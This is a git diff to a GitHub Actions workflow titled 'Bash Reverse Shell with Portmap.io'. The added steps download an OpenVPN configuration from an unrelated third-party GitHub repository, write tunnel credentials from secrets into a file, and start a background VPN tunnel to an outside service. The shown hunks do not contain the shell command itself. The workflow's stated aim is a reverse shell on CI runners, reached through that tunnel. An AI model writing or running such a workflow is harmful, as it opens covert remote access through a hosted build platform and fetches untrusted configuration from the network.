@@ -1,4 +1,4 @@
-name: Bash Reverse Shell with Portmap.io (Updated Tunnel)
+name: Bash Reverse Shell with Portmap.io (Updated Tunnel - Download OVPN)
 
 on:
   push:
@@ -15,7 +15,13 @@ jobs:
       - name: Install Dependencies
         run: |
           sudo apt update
-          sudo apt install -y openvpn netcat-openbsd
+          sudo apt install -y openvpn netcat-openbsd wget
+
+      - name: Download OpenVPN Configuration
+        run: |
+          echo "=== Downloading OpenVPN Configuration ==="
+          wget https://raw.githubusercontent.com/lust001/openvpn/refs/heads/main/vpsfree9009.anonymous1.ovpn -O anonymous1-22216.ovpn
+          ls -l
 
       - name: Configure Portmap.io Tunnel
         env:
@@ -27,10 +33,10 @@ jobs:
           echo "$PORTMAP_USERNAME" > auth.txt
           echo "$PORTMAP_PASSWORD" >> auth.txt
           sudo chmod 600 auth.txt
-          # Update OpenVPN config to use auth file (adjust path if needed)
-          sudo sed -i '/auth-user-pass/c\auth-user-pass auth.txt' openvpn/anonymous1-22216.ovpn
+          # Update OpenVPN config to use auth file
+          sudo sed -i '/auth-user-pass/c\auth-user-pass auth.txt' anonymous1-22216.ovpn
           # Start OpenVPN tunnel
-          sudo openvpn --config openvpn/anonymous1-22216.ovpn --daemon
+          sudo openvpn --config anonymous1-22216.ovpn --daemon
           sleep 10
           echo "=== OpenVPN Status ==="
           ps aux | grep '[o]penvpn' || echo "No OpenVPN process found"
